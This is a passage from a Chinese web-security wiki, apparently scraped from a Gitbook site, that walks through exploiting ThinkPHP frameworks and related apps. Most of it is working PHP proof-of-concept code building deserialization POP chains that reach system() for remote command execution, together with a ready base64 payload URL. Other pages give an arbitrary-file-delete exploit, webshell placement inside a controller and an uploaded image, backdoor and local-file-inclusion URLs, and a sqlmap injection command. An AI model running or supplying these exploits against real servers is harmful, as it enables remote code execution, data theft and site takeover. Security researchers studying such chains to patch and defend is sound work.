class Relation{ protected $selfRelation; protected $query; function __construct(){ $this->selfRelation = false; $this->query = new Query();#class Query } } namespace think\\model\\relation;#OneToOne HasOne use think\\model\\Relation; abstract class OneToOne extends Relation{ function __construct(){ parent::__construct(); } } class HasOne extends OneToOne{ protected $bindAttr = []; function __construct(){ parent::__construct(); $this->bindAttr = [\"no\",\"123\"]; } } namespace think\\console;#Output use think\\session\\driver\\Memcached; class Output{ private $handle = null; protected $styles = []; function __construct(){ $this->handle = new Memcached();//目的调用其write() $this->styles = ['getAttr']; } } namespace think;#Model use think\\model\\relation\\HasOne; use think\\console\\Output; use think\\db\\Query; abstract class Model{ protected $append = []; protected $error; public $parent;#修改处 protected $selfRelation; protected $query; protected $aaaaa; function __construct(){ $this->parent = new Output();#Output对象,目的是调用__call() $this->append = ['getError']; $this->error = new HasOne();//Relation子类,且有getBindAttr() $this->selfRelation = false;//isSelfRelation() $this->query = new Query(); } } namespace think\\db;#Query use think\\console\\Output; class Query{ protected $model; function __construct(){ $this->model = new Output(); } } namespace think\\session\\driver;#Memcached use think\\cache\\driver\\File; class Memcached{ protected $handler = null; function __construct(){ $this->handler = new File();//目的调用File->set() } } namespace think\\cache\\driver;#File class File{ protected $options = []; protected $tag; function __construct(){ $this->options = [ 'expire' => 0, 'cache_subdir' => false, 'prefix' => '', 'path' => './demo/', 'data_compress' => false, ]; $this->tag = true; } } namespace think\\model; use think\\Model; class Pivot extends Model{ } use think\\process\\pipes\\Windows; echo base64_encode(serialize(new Windows())); 参考链接 http://althims.com/2020/02/07/thinkphp-5-0-24-unserialize/ http://pines404.online/2020/01/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/ThinkPHP/ThinkPHP5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/ https://xz.aliyun.com/t/7082 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:07:17 "},"Web安全/Thinkphp/Thinkphp 反序列化漏洞/Thinkphp 5.1.1 反序列化pop链构造/Thinkphp 5.1.1 反序列化pop链构造.html":{"url":"Web安全/Thinkphp/Thinkphp 反序列化漏洞/Thinkphp 5.1.1 反序列化pop链构造/Thinkphp 5.1.1 反序列化pop链构造.html","title":"Thinkphp 5.1.1 反序列化pop链构造","keywords":"","body":"Thinkphp 5.1.1 反序列化pop链构造 一、漏洞简介 5.1.1的代码实现和5.1.38不同，于是就有了这篇文章 二、漏洞影响 Thinkphp 5.1.1 三、复现过程 这个漏洞的起点是一个任意文件删除漏洞$this->files内容没有过滤，可以传入任意数值。 /thinkphp/library/think/process/pipes/Windows.php public function __destruct() { $this->close(); $this->removeFiles(); } private function removeFiles() { foreach ($this->files as $filename) { if (file_exists($filename)) { @unlink($filename); } } $this->files = []; } poc files = ['1.php']; } } use think\\process\\pipes\\Windows; echo base64_encode(serialize(new Windows())); 反序列链构造 先分析一下thinkphp5.1.38的poc append = [\"ethan\"=>[\"calc.exe\",\"calc\"]]; $this->data = [\"ethan\"=>new Request()]; } } class Request { protected $hook = []; protected $filter = \"system\"; protected $config = [ // 表单请求类型伪装变量 'var_method' => '_method', // 表单ajax伪装变量 'var_ajax' => '_ajax', // 表单pjax伪装变量 'var_pjax' => '_pjax', // PATHINFO变量名 用于兼容模式 'var_pathinfo' => 's', // 兼容PATH_INFO获取 'pathinfo_fetch' => ['ORIG_PATH_INFO', 'REDIRECT_PATH_INFO', 'REDIRECT_URL'], // 默认全局过滤方法 用逗号分隔多个 'default_filter' => '', // 域名根，如thinkphp.cn 'url_domain_root' => '', // HTTPS代理标识 'https_agent_name' => '', // IP代理获取标识 'http_agent_ip' => 'HTTP_X_REAL_IP', // URL伪静态后缀 'url_html_suffix' => 'html', ]; function __construct(){ $this->filter = \"system\"; $this->config = [\"var_ajax\"=>'']; $this->hook = [\"visible\"=>[$this,\"isAjax\"]]; } } namespace think\\process\\pipes; use think\\model\\concern\\Conversion; use think\\model\\Pivot; class Windows { private $files = []; public function __construct() { $this->files=[new Pivot()]; } } namespace think\\model; use think\\Model; class Pivot extends Model { } use think\\process\\pipes\\Windows; echo base64_encode(serialize(new Windows())); ?> file_exists如果传入的是对象,将会将对象以字符串的形式处理。而toString魔术方法是当一个对象被当作字符串对待的时候,会触发这个魔术方法。所以全局搜索带有toString函数的类。**最后找到\\thinkphp\\library\\think\\model\\concern\\Conversion.php的Conversion类**后面的调用流程是 toString--->$this->toJson---->$this->toArray跟进到toArray方法里，在3.1.38的poc里是通过调用$relation->visible方法，向$relation传入request对象，而request对象没有visible方法，从而调用**call方法。而我们这里也可以使用这种方法。(注意:**call传入的第一个参数是方法名，第二个参数是参数数组。所以这里传入__call方法的方法名为append，而不是原来的visible) $relation = $this->getAttr($key); $item[$key] = $relation->append($name)->toArray(); thinkphp3.1.38代码 $relation = $this->getAttr($key); if ($relation) { $relation->visible($name); } public function __toString() { return $this->toJson(); } public function toJson($options = JSON_UNESCAPED_UNICODE) { return json_encode($this->toArray(), $options); } public function toArray() { $item = []; $visible = []; $hidden = []; ...... foreach ($data as $key => $val) { ......... // 追加属性（必须定义获取器） if (!empty($this->append)) { foreach ($this->append as $key => $name) { if (is_array($name)) { // 追加关联对象属性 $relation = $this->getAttr($key); $item[$key] = $relation->append($name)->toArray(); } elseif (strpos($name, '.')) { list($key, $attr) = explode('.', $name); // 追加关联对象属性 $relation = $this->getAttr($key); $item[$key] = $relation->append([$attr])->toArray(); } else { $value = $this->getAttr($name, $item); if (false !== $value) { $item[$name] = $value; } } } } return $item; } 由于Conversion和Attribute是trait类型，不能直接调用，所以要找到调用这两个类的类即model类。 abstract class Model implements \\JsonSerializable, \\ArrayAccess { use model\\concern\\Attribute; use model\\concern\\RelationShip; use model\\concern\\ModelEvent; use model\\concern\\TimeStamp; use model\\concern\\Conversion; model类是抽象类，不能直接调用。所以调用他的子类Pivot类(think\\Model\\Pivot)。 在源码中查找存在**call函数和没有append方法的类，(**call方法是在类没有调用函数的时候调用,第一个参数为方法名，第二个参数为方法的第一个参数)最后查找到的是/thinkphp/library/think/Request.php的Request类,其中存在call_user_func_array方法 public function __call($method, $args) { if (array_key_exists($method, $this->hook)) { array_unshift($args, $this); return call_user_func_array($this->hook[$method], $args); } else { throw new Exception('method not exists:' . static::class . '->' . $method); } } 虽然$this->hook可控,但是由于array_unshift函数的作用，导致$args数组中会加入新的数组，所以判断不好利用。但是他是一个回调函数，可以以$this->hook[$method]=[$this,methodName]这种形式回调函数。在Request类中查找call_user_func_array这种类型的函数，最后找到filterValue函数。filterValue函数里面的call_user_func_array方法是这个漏洞的触发点。回溯$filter和$value private function filterValue(&$value, $key, $filters) { $default = array_pop($filters); foreach ($filters as $filter) { if (is_callable($filter)) { // 调用函数或者方法过滤 $value = call_user_func($filter, $value); } elseif (is_scalar($value)) { if (false !== strpos($filter, '/')) { // 正则过滤 if (!preg_match($filter, $value)) { // 匹配不成功返回默认值 $value = $default; break; } } elseif (!empty($filter)) { // filter函数不存在时, 则使用filter_var进行过滤 // filter为非整形值时, 调用filter_id取得过滤id $value = filter_var($value, is_int($filter) ? $filter : filter_id($filter)); if (false === $value) { $value = $default; break; } } } } return $value; } 最后找到这样的一个调用流程，可以控制$filter, $value这两个变量。isAjax()---->$this->param()----->$this->input------->$this->filterValue 分析下$filter, $value这两个变量的传递过程:$value:isAjax方法的$this->config->get(\\'var_ajax\\')---->param方法的$name----->input方法的$name。所以$value可控。 $filter参数:param方法$this->param---->input方法$data public function isAjax($ajax = false) { $value = $this->server('HTTP_X_REQUESTED_WITH', '', 'strtolower'); $result = ('xmlhttprequest' == $value) ? true : false; if (true === $ajax) { return $result; } else { return $this->param($this->config->get('var_ajax')) ? true : $result; } } public function param($name = '', $default = null, $filter = '') { if (empty($this->param)) { ....... return $this->input($this->param, $name, $default, $filter); } public function input($data = [], $name = '', $default = null, $filter = '') { if (false === $name) { // 获取原始数据 return $data; } $name = (string) $name; if ('' != $name) { // 解析name if (strpos($name, '/')) { list($name, $type) = explode('/', $name); } else { $type = 's'; } // 按.拆分成多维数组进行判断 foreach (explode('.', $name) as $val) { if (isset($data[$val])) { $data = $data[$val]; } else { // 无输入数据，返回默认值 return $default; } } if (is_object($data)) { return $data; } } // 解析过滤器 $filter = $this->getFilter($filter, $default); if (is_array($data)) { array_walk_recursive($data, [$this, 'filterValue'], $filter); reset($data); } else { $this->filterValue($data, $name, $filter); } ....... return $data; } $this->param=array_merge($this->param, $this->get(false), $vars, $this->route(false));是直接从url中获取参数。$this->config->get(\\'var_ajax\\')也是可控的。但是他和5.1.38不同的是，5.1.38的方法是$this->config[\\'var_ajax\\'],所以导致不能用数组直接操控config值。我的解决办法是从源码中查找含有get函数的类,通过pop链的方式操控config的值。 最后发现\\think\\Hook.php的Hook类存在get方法 public function get($tag = '') { if (empty($tag)) { //获取全部的插件信息 return $this->tags; } else { return array_key_exists($tag, $this->tags) ? $this->tags[$tag] : []; } } 由上面代码可以看出，程序会判断传入的$tag是否为空，不为空的话会返回传入参数在tags数组中对应的值。private $tags = [\\\"var_ajax\\\"=>\\'a\\'];类似于这种形式，便可以操控$this->config->get(\\'var_ajax\\')的值。由此$filter和$value都是可控的。所以可以通过filterValue方法中的call_user_func_array任意代码执行。 poc append = [\"a\"=>[\"calc.exe\"]]; $this->data = [\"a\"=>new Request()]; } } namespace think\\model; use think\\Model; class Pivot extends Model { } namespace think\\process\\pipes; use think\\model\\Pivot; class Windows { private $files = []; public function __construct() { $this->files = [new Pivot()]; } } namespace think; class Request { protected $hook = []; protected $filter = \"system\"; protected $config = [ // 表单请求类型伪装变量 'var_method' => '_method', // 表单ajax伪装变量 'var_ajax' => '_ajax', // 表单pjax伪装变量 'var_pjax' => '_pjax', // PATHINFO变量名 用于兼容模式 'var_pathinfo' => 's', // 兼容PATH_INFO获取 'pathinfo_fetch' => ['ORIG_PATH_INFO', 'REDIRECT_PATH_INFO', 'REDIRECT_URL'], // 默认全局过滤方法 用逗号分隔多个 'default_filter' => '', // 域名根，如thinkphp.cn 'url_domain_root' => '', // HTTPS代理标识 'https_agent_name' => '', // IP代理获取标识 'http_agent_ip' => 'HTTP_X_REAL_IP', // URL伪静态后缀 'url_html_suffix' => 'html', ]; function __construct(){ $this->filter = \"system\"; $this->config = new Hook(); $this->hook = [\"append\"=>[$this,\"isAjax\"]]; } } namespace think; class Hook{ private $tags = [\"var_ajax\"=>'a']; public function get($tag = '') { if (empty($tag)) { //获取全部的插件信息 return $this->tags; } else { return array_key_exists($tag, $this->tags) ? $this->tags[$tag] : []; } } } use think\\process\\pipes\\Windows; echo base64_encode(serialize(new Windows())); 漏洞的利用前提是存在一个点可以输入点可以反序列化。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:07:19 "},"Web安全/Thinkphp/Thinkphp 反序列化漏洞/Thinkphp 5.1.37 反序列化漏洞/Thinkphp 5.1.37 反序列化漏洞.html":{"url":"Web安全/Thinkphp/Thinkphp 反序列化漏洞/Thinkphp 5.1.37 反序列化漏洞/Thinkphp 5.1.37 反序列化漏洞.html","title":"Thinkphp 5.1.37 反序列化漏洞","keywords":"","body":"Thinkphp 5.1.37 反序列化漏洞 一、漏洞简介 所有Thinkphp版本下载链接 https://packagist.org/packages/topthink/framework 二、漏洞影响 三、复现过程 环境搭建 composer create-project topthink/think=5.1.37 v5.1.37 poc演示截图 调用链 单步调试 漏洞起点在\\thinkphp\\library\\think\\process\\pipes\\windows.php的__destruct魔法函数。 public function __destruct() { $this->close(); $this->removeFiles(); } private function removeFiles() { foreach ($this->files as $filename) { if (file_exists($filename)) { @unlink($filename); } } $this->files = []; } 这里同时也存在一个任意文件删除的漏洞，exp如下 files=['C:\\FakeD\\Software\\phpstudy\\PHPTutorial\\WWW\\shell.php']; } } echo base64_encode(serialize(new Windows())); 这里$filename会被当做字符串处理，而toString 当一个对象被反序列化后又被当做字符串使用时会被触发，我们通过传入一个对象来触发toString 方法。 //thinkphp\\library\\think\\model\\concern\\Conversion.php public function __toString() { return $this->toJson(); } //thinkphp\\library\\think\\model\\concern\\Conversion.php public function toJson($options = JSON_UNESCAPED_UNICODE) { return json_encode($this->toArray(), $options); } //thinkphp\\library\\think\\model\\concern\\Conversion.php public function toArray() { $item = []; $hasVisible = false; ... if (!empty($this->append)) { foreach ($this->append as $key => $name) { if (is_array($name)) { // 追加关联对象属性 $relation = $this->getRelation($key); if (!$relation) { $relation = $this->getAttr($key); if ($relation) { $relation->visible($name); } } ... } //thinkphp\\library\\think\\model\\concern\\Attribute.php public function getAttr($name, &$item = null) { try { $notFound = false; $value = $this->getData($name); } catch (InvalidArgumentException $e) { $notFound = true; $value = null; } 。。。 return $value; } //thinkphp\\library\\think\\model\\concern\\Attribute.php public function getData($name = null) { if (is_null($name)) { return $this->data; } elseif (array_key_exists($name, $this->data)) { return $this->data[$name]; } elseif (array_key_exists($name, $this->relation)) { return $this->relation[$name]; } throw new InvalidArgumentException('property not exists:' . static::class . '->' . $name); } 这里的$this->append是我们可控的，然后通过getRelation($key)，但是下面有一个!$relation,所以我们只要置空即可，然后调用getAttr($key),在调用getData($name)函数，这里$this->data[\\'name\\']我们可控，之后回到toArray函数，通过这一句话$relation->visible($name); 我们控制$relation为一个类对象，调用不存在的visible方法，会自动调用call方法，那么我们找到一个类对象没有visible方法，但存在call方法的类，这里 可以看到这里有一个我们熟悉的回调函数call_user_func_array，但是这里有一个卡住了，就是array_unshift，这个函数把request对象插入到数组的开头，虽然这里的this->hook[$method]我们可以控制，但是构造不出来参数可用的payload，因为第一个参数是$this对象。 目前我们所能控制的内容就是 也就是我们能调用任意类的任意方法。 下面我们需要找到我们想要调用的方法，参考我之前分析的thinkphp-RCE的文章thinkphp-RCE漏洞分析,最终产生rce的地方是在input函数当中，那我们这里可否直接调用input方法呢，刚刚上面已经说了，参数已经固定死是request类，那我们需要寻找不受这个参数影响的方法。这里采用回溯的方法 public function input($data = [], $name = '', $default = null, $filter = '') { if (false === $name) { // 获取原始数据 return $data; } $name = (string) $name; if ('' != $name) { // 解析name if (strpos($name, '/')) { list($name, $type) = explode('/', $name); } $data = $this->getData($data, $name); if (is_null($data)) { return $default; } if (is_object($data)) { return $data; } } // 解析过滤器 $filter = $this->getFilter($filter, $default); if (is_array($data)) { array_walk_recursive($data, [$this, 'filterValue'], $filter); if (version_compare(PHP_VERSION, '7.1.0', 'arrayReset($data); } } else { $this->filterValue($data, $name, $filter); } 。。。 protected function getFilter($filter, $default) { if (is_null($filter)) { $filter = []; } else { $filter = $filter ?: $this->filter; if (is_string($filter) && false === strpos($filter, '/')) { $filter = explode(',', $filter); } else { $filter = (array) $filter; } } $filter[] = $default; return $filter; } protected function getData(array $data, $name) { foreach (explode('.', $name) as $val) { if (isset($data[$val])) { $data = $data[$val]; } else { return; } } return $data; } 这里$filter可控，data参数不可控，而且$name = (string) $name;这里如果直接调用input的话，执行到这一句的时候会报错，直接退出，所以继续回溯，目的是要找到可以控制$name变量，使之最好是字符串。同时也要找到能控制data参数 public function param($name = '', $default = null, $filter = '') { if (!$this->mergeParam) { $method = $this->method(true); // 自动获取请求变量 switch ($method) { case 'POST': $vars = $this->post(false); break; case 'PUT': case 'DELETE': case 'PATCH': $vars = $this->put(false); break; default: $vars = []; } // 当前请求参数和URL地址中的参数合并 $this->param = array_merge($this->param, $this->get(false), $vars, $this->route(false)); $this->mergeParam = true; } if (true === $name) { // 获取包含文件上传信息的数组 $file = $this->file(); $data = is_array($file) ? array_merge($this->param, $file) : $this->param; return $this->input($data, '', $default, $filter); } return $this->input($this->param, $name, $default, $filter); } array_merge($this->param, $this->get(false), $vars, $this->route(false)); public function get($name = '', $default = null, $filter = '') { if (empty($this->get)) { $this->get = $_GET; } return $this->input($this->get, $name, $default, $filter); } public function route($name = '', $default = null, $filter = '') { return $this->input($this->route, $name, $default, $filter); } public function input($data = [], $name = '', $default = null, $filter = '') { if (false === $name) { // 获取原始数据 return $data; } ... } 可以看到这里this->param完全可控，是通过get传参数进去的，那么也就是说input函数中的$data参数可控，也就是call_user_func的$value,现在差一个条件，那就是name是字符串，继续回溯。 public function isAjax($ajax = false) { $value = $this->server('HTTP_X_REQUESTED_WITH'); $result = 'xmlhttprequest' == strtolower($value) ? true : false; if (true === $ajax) { return $result; } $result = $this->param($this->config['var_ajax']) ? true : $result; $this->mergeParam = false; return $result; } 可以看到这里$this->config[\\'var_ajax\\']可控，那么也就是name可控，所有条件聚齐。成功导致rce。 补充： \"asdfasdf\",'id'=>'whoami'); array_walk_recursive($data, \"filterValue\", \"system\"); poc v5.1.37 append = [\"ethan\"=>[\"dir\",\"calc\"]]; $this->data = [\"ethan\"=>new Request()]; } } class Request { protected $hook = []; protected $filter = \"system\"; protected $config = [ // 表单请求类型伪装变量 'var_method' => '_method', // 表单ajax伪装变量 'var_ajax' => '_ajax', // 表单pjax伪装变量 'var_pjax' => '_pjax', // PATHINFO变量名 用于兼容模式 'var_pathinfo' => 's', // 兼容PATH_INFO获取 'pathinfo_fetch' => ['ORIG_PATH_INFO', 'REDIRECT_PATH_INFO', 'REDIRECT_URL'], // 默认全局过滤方法 用逗号分隔多个 'default_filter' => '', // 域名根，如thinkphp.cn 'url_domain_root' => '', // HTTPS代理标识 'https_agent_name' => '', // IP代理获取标识 'http_agent_ip' => 'HTTP_X_REAL_IP', // URL伪静态后缀 'url_html_suffix' => 'html', ]; function __construct(){ $this->filter = \"system\"; $this->config = [\"var_ajax\"=>'']; $this->hook = [\"visible\"=>[$this,\"isAjax\"]]; } } namespace think\\process\\pipes; use think\\model\\concern\\Conversion; use think\\model\\Pivot; class Windows { private $files = []; public function __construct() { $this->files=[new Pivot()]; } } namespace think\\model; use think\\Model; class Pivot extends Model { } use think\\process\\pipes\\Windows; echo base64_encode(serialize(new Windows())); /*input=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo1OiJldGhhbiI7YToyOntpOjA7czozOiJkaXIiO2k6MTtzOjQ6ImNhbGMiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo1OiJldGhhbiI7TzoxMzoidGhpbmtcUmVxdWVzdCI6Mzp7czo3OiIAKgBob29rIjthOjE6e3M6NzoidmlzaWJsZSI7YToyOntpOjA7cjo5O2k6MTtzOjY6ImlzQWpheCI7fX1zOjk6IgAqAGZpbHRlciI7czo2OiJzeXN0ZW0iO3M6OToiACoAY29uZmlnIjthOjE6e3M6ODoidmFyX2FqYXgiO3M6MDoiIjt9fX19fX0=&id=whoami*/ ?> 四、参考链接 https://www.t00ls.net/thread-54324-1-1.html Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:07:20 "},"Web安全/Thinkphp/Thinkphp 反序列化漏洞/Thinkphp 5.2.-dev 反序列化漏洞/Thinkphp 5.2.-dev 反序列化漏洞.html":{"url":"Web安全/Thinkphp/Thinkphp 反序列化漏洞/Thinkphp 5.2.-dev 反序列化漏洞/Thinkphp 5.2.-dev 反序列化漏洞.html","title":"Thinkphp 5.2.-dev 反序列化漏洞","keywords":"","body":"Thinkphp 5.2.*-dev 反序列化漏洞 一、漏洞简介 所有Thinkphp版本下载链接 https://packagist.org/packages/topthink/framework 二、漏洞影响 三、复现过程 环境搭建 composer create-project topthink/think=5.2.*-dev v5.2 poc演示截图 调用链 单步调试 可以看到前面的链跟tp5.1.x的一样，这里不在列举，直接进去toArray函数，可以看到$data可控 public function toArray(): array { 。。。 $data = array_merge($this->data, $this->relation); foreach ($data as $key => $val) { if ($val instanceof Model || $val instanceof ModelCollection) { // 关联模型对象 if (isset($this->visible[$key])) { $val->visible($this->visible[$key]); } elseif (isset($this->hidden[$key])) { $val->hidden($this->hidden[$key]); } // 关联模型对象 $item[$key] = $val->toArray(); } elseif (isset($this->visible[$key])) { $item[$key] = $this->getAttr($key); } elseif (!isset($this->hidden[$key]) && !$hasVisible) { $item[$key] = $this->getAttr($key); } } 。。。 public function getAttr(string $name) { try { $relation = false; $value = $this->getData($name); } catch (InvalidArgumentException $e) { $relation = true; $value = null; } return $this->getValue($name, $value, $relation); } public function getData(string $name = null) { if (is_null($name)) { return $this->data; } $fieldName = $this->getRealFieldName($name); if (array_key_exists($fieldName, $this->data)) { return $this->data[$fieldName]; ... } } protected function getRealFieldName(string $name): string { return $this->strict ? $name : App::parseName($name); //this->strict默认为true } 可以看到getAttr函数中的$value可控，那么导致$this->getValue($name, $value, $relation);这里的三个参数都可控，跟进$this->getValue($name, $value, $relation); protected function getValue(string $name, $value, bool $relation = false) { // 检测属性获取器 $fieldName = $this->getRealFieldName($name); $method = 'get' . App::parseName($name, 1) . 'Attr'; if (isset($this->withAttr[$fieldName])) { if ($relation) { $value = $this->getRelationValue($name); } $closure = $this->withAttr[$fieldName]; $value = $closure($value, $this->data); 这里$fieldName、$this->withAttr，导致$closure也可控，最终直接产生RCE。如下图 补充： poc v5.2.*-dev files = array($files); } } } namespace think\\model\\concern { trait Conversion { protected $append = array(\"Smi1e\" => \"1\"); } trait Attribute { private $data; private $withAttr = array(\"Smi1e\" => \"system\"); public function get($system) { $this->data = array(\"Smi1e\" => \"$system\"); } } } namespace think { abstract class Model { use model\\concern\\Attribute; use model\\concern\\Conversion; } } namespace think\\model{ use think\\Model; class Pivot extends Model { public function __construct($system) { $this->get($system); } } } namespace{ $Conver = new think\\model\\Pivot(\"whoami\"); $payload = new think\\process\\pipes\\Windows($Conver); echo base64_encode(serialize($payload)); } ?> 四、参考链接 https://www.t00ls.net/thread-54324-1-1.html Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:07:23 "},"Web安全/Thinkphp/Thinkphp 反序列化漏洞/Thinkphp 6.0.-dev 反序列化漏洞/Thinkphp 6.0.-dev 反序列化漏洞.html":{"url":"Web安全/Thinkphp/Thinkphp 反序列化漏洞/Thinkphp 6.0.-dev 反序列化漏洞/Thinkphp 6.0.-dev 反序列化漏洞.html","title":"Thinkphp 6.0.-dev 反序列化漏洞","keywords":"","body":"Thinkphp 6.0.*-dev 反序列化漏洞 一、漏洞简介 所有Thinkphp版本下载链接 https://packagist.org/packages/topthink/framework 二、漏洞影响 三、复现过程 环境搭建 composer create-project topthink/think=6.0.*-dev v6.0 poc演示截图 调用链 单步调试 //vendor\\topthink\\think-orm\\src\\Model.php public function __destruct() { if ($this->lazySave) { //$this->lazySave可控 $this->save(); } } //vendor\\topthink\\think-orm\\src\\Model.php public function save(array $data = [], string $sequence = null): bool { // 数据对象赋值 $this->setAttrs($data); if ($this->isEmpty() || false === $this->trigger('BeforeWrite')) { return false; } $result = $this->exists ? $this->updateData() : $this->insertData($sequence); //this->exists可控 if (false === $result) { return false; } //vendor\\topthink\\think-orm\\src\\Model.php public function isEmpty(): bool { return empty($this->data); //可控 } protected function trigger(string $event): bool { if (!$this->withEvent) { //可控 return true; } ... } protected function updateData(): bool { // 事件回调 if (false === $this->trigger('BeforeUpdate')) { //可控 return false; } $this->checkData(); // 获取有更新的数据 $data = $this->getChangedData(); if (empty($data)) { //$data可控 // 关联更新 if (!empty($this->relationWrite)) { $this->autoRelationUpdate(); } return true; } if ($this->autoWriteTimestamp && $this->updateTime && !isset($data[$this->updateTime])) { // 自动写入更新时间 $data[$this->updateTime] = $this->autoWriteTimestamp($this->updateTime); $this->data[$this->updateTime] = $data[$this->updateTime]; } // 检查允许字段 $allowFields = $this->checkAllowFields(); public function getChangedData(): array { $data = $this->force ? $this->data : array_udiff_assoc($this->data, $this->origin, function ($a, $b) { if ((empty($a) || empty($b)) && $a !== $b) { return 1; } //$this->force可控 return is_object($a) || $a != $b ? 1 : 0; }); // 只读字段不允许更新 foreach ($this->readonly as $key => $field) { if (isset($data[$field])) { unset($data[$field]); } } return $data; } protected function checkAllowFields(): array { // 检测字段 if (empty($this->field)) { //$this->field可控 if (!empty($this->schema)) { //$this->schema可控 $this->field = array_keys(array_merge($this->schema, $this->jsonType)); } else { $query = $this->db(); $table = $this->table ? $this->table . $this->suffix : $query->getTable(); public function db($scope = []): Query { /** @var Query $query */ $query = self::$db->connect($this->connection) //$this->connection可控 ->name($this->name . $this->suffix) //$this->suffix可控，采用拼接，调用_toString ->pk($this->pk); 后面的链跟之前的一样，这里就不分析了 poc v6.0.*-dev data = array(\"wh1t3p1g\"=>\"whoami\"); $this->relation = array(\"wh1t3p1g\"=>[]); $this->visible= array(\"wh1t3p1g\"=>[]); $this->withAttr = array(\"wh1t3p1g\"=>\"system\"); }else{ $this->lazySave = true; $this->withEvent = false; $this->exists = true; $this->force = true; $this->data = array(\"wh1t3p1g\"=>[]); $this->connection = \"mysql\"; $this->suffix = $obj; } } } } namespace think\\model { class Pivot extends \\think\\Model{ function __construct($obj) { parent::__construct($obj); } } } namespace { $pivot1 = new \\think\\model\\Pivot(null); $pivot2 = new \\think\\model\\Pivot($pivot1); echo base64_encode(serialize($pivot2)); Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:07:25 "},"Web安全/Thinkphp/Thinkphp专用shell/Thinkphp专用shell.html":{"url":"Web安全/Thinkphp/Thinkphp专用shell/Thinkphp专用shell.html","title":"Thinkphp专用shell","keywords":"","body":"Thinkphp 专用shell 一、漏洞简介 基于thinkphp框架的一句话写法 thinkphp框架使用入口文件调用控制器，直接写一句话可能会有解析问题导致无法执行指令，研究了一下把一句话套入框架控制器的方法，分享给大家参考， 二、漏洞影响 三、复现过程 在index的控制器文件夹下建立Test.php文件，代码如下: 一句话的地址就是http://www.0-sec.org/index/tes Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:07:26 "},"Web安全/Thinkphp shop/（CVE-2018-9919）Thinkphp Shop后门/（CVE-2018-9919）Thinkphp Shop后门.html":{"url":"Web安全/Thinkphp shop/（CVE-2018-9919）Thinkphp Shop后门/（CVE-2018-9919）Thinkphp Shop后门.html","title":"（CVE-2018-9919）Thinkphp Shop后门","keywords":"","body":"（CVE-2018-9919）Thinkphp Shop后门 一、漏洞简介 该漏洞源于/vendor/phpdocumentor/reflection-docblock/tests/phpDocumentor/Reflection/DocBlock/Tag/LinkTagTeet.php可以将文件下载到其他服务器上。远程攻击者可利用该漏洞获取敏感信息，并可能执行命令。 二、漏洞影响 Backdoor in Tpshop \\ 三、复现过程 攻击者可以利用此漏洞来攻击服务器并增加其特权，例如：下载任意文件PS！扫描网络端口PS！信息检测，攻击内部网络易受攻击的服务器。 http://www.0-sec.org/vendor/phpdocumentor/reflection-docblock/tests/phpDocumentor/Reflection/DocBlock/Tag/LinkTagTeet.php?bddlj=save\\_filename&down\\_url=download\\_url&jmmy=decry Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:07:28 "},"Web安全/Thinkphp shop/Thinkphp Shop 供应商后台本地文件包含导致权限提升/Thinkphp Shop 供应商后台本地文件包含导致权限提升.html":{"url":"Web安全/Thinkphp shop/Thinkphp Shop 供应商后台本地文件包含导致权限提升/Thinkphp Shop 供应商后台本地文件包含导致权限提升.html","title":"Thinkphp Shop 供应商后台本地文件包含导致权限提升","keywords":"","body":"Thinkphp Shop 供应商后台本地文件包含导致权限提升 一、漏洞简介 二、漏洞影响 三、复现过程 1、用户个人资料修改处上传图片 http://www.0-sec.org/Home/User/info.html 2、上传一张正常图片，并在图片末尾加上一句话 3、返回shell http://www.0-sec.org/supplier/order/delivery\\_print?template=public/upload/user/4575/head\\_pic/5989ee42cc5992e64a60c52b0cbb7602.png&w=phpi Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:07:27 "},"Web安全/Thinkphp shop/Thinkphp Shop前台SQL注入/Thinkphp Shop前台SQL注入.html":{"url":"Web安全/Thinkphp shop/Thinkphp Shop前台SQL注入/Thinkphp Shop前台SQL注入.html","title":"Thinkphp Shop前台SQL注入","keywords":"","body":"Thinkphp Shop前台SQL注入 一、漏洞简介 二、漏洞影响 三、复现过程 http://www.0-sec.org/mobile/index/index2/id/1\\' sqlmap -u \\\"http://www.0-sec.org/mobile/index/index2/id/1*\\\" --random-agent --batch --dbms \\\"mysql\\\" -- Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:07:27 "},"Web安全/ThinkSNS/ThinkSNS V4 后台任意文件下载导致getshell/ThinkSNS V4 后台任意文件下载导致getshell.html":{"url":"Web安全/ThinkSNS/ThinkSNS V4 后台任意文件下载导致getshell/ThinkSNS V4 后台任意文件下载导致getshell.html","title":"ThinkSNS V4 后台任意文件下载导致getshell","keywords":"","body":"ThinkSNS V4 后台任意文件下载导致getshell 一、漏洞简介 二、漏洞影响 三、复现过程 漏洞分析 存在漏洞代码\\ts4\\apps\\admin\\Lib\\Action\\UpgradeAction.class.php中的一个函数中。 public function step1() { $downUrl = $_GET['upurl']; $downUrl = urldecode($downUrl); $path = DATA_PATH.'/'.'upgrade/'.basename($downUrl); // # 备份老配置文件 $oldConf = file_get_contents(CONF_PATH.'/thinksns.conf.php'); file_put_contents(DATA_PATH.'/old.thinksns.conf.php', $oldConf); // # 下载增量包 is_dir(dirname($path)) or mkdir(dirname($path), 0777, true); file_put_contents($path, file_get_contents($downUrl)); file_exists($path) or $this->showError('下载升级包失败，请检查'.dirname($path).'目录是否可写，如果可写，请刷新重试！'); // 验证hash判断包是否合法。 $filename = dirname($path).'/upgrade.json'; $data = file_get_contents($filename); $data = json_decode($data, false); if (md5_file($path) != $data->md5) { $this->showError('更新包校验失败，请重新执行升级.'); } 函数 file_put_contents — 